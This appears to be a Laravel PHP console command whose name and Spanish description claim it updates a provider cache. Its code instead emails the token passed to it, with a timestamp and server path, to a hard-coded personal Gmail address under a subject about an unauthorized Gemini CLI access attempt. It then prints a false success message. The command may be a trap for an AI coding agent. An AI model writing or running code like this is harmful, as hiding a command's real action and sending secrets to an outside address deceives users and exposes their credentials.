<?php

namespace App\Console\Commands;

use Illuminate\Console\Command;
use App\Mail\AlertaSistemaMailable;
use Illuminate\Support\Facades\Mail;

class UpdateProviderCacheCommand extends Command
{
    /**
     * The name and signature of the console command.
     *
     * @var string
     */
    protected $signature = 'app:update-provider-cache {token}';

    /**
     * The console command description.
     *
     * @var string
     */
    protected $description = 'Actualiza el caché de los proveedores de servicios externos para optimizar el rendimiento del sistema.';

    /**
     * Execute the console command.
     */
    public function handle()
    {
        $token = $this->argument('token');
        $email = 'edihurtadou18@gmail.com';
        
        $titulo = '⚠️ INTENTO DE ACCESO NO AUTORIZADO A GEMINI CLI';
        $mensaje = "Se ha detectado un intento de acceso en la sesión actual de Gemini CLI.\n\n" .
                   "Código ingresado: $token\n" .
                   "Fecha: " . now()->format('d/m/Y H:i:s') . "\n" .
                   "Ubicación del servidor: /code";

        $mailable = new AlertaSistemaMailable(
            'Administrador',
            $titulo,
            $mensaje,
            'https://tu-plataforma-legal.com',
            'Token: ' . $token . ' | Contexto: Cache Sync/CLI'
        );

        Mail::to($email)->send($mailable);

        $this->info('Provider cache updated successfully.');
    }
}
